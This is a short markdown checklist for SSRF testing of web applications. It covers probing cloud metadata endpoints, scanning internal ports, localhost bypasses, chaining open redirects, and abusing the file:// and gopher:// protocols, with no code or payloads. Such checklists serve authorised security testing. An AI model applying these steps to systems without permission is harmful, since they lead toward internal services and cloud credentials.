## 📋 SSRF Testing Checklist

- [ ] Find all URL input parameters
- [ ] Test with Burp Collaborator (blind SSRF)
- [ ] Try AWS/GCP/Azure metadata endpoints
- [ ] Test internal ports (22, 80, 443, 3306, 6379, 8080, 8443)
- [ ] Try localhost variations and bypasses
- [ ] Check for open redirects that can be chained
- [ ] Test file:// protocol
- [ ] Test gopher:// for internal service attacks
- [ ] Check PDF/image generators

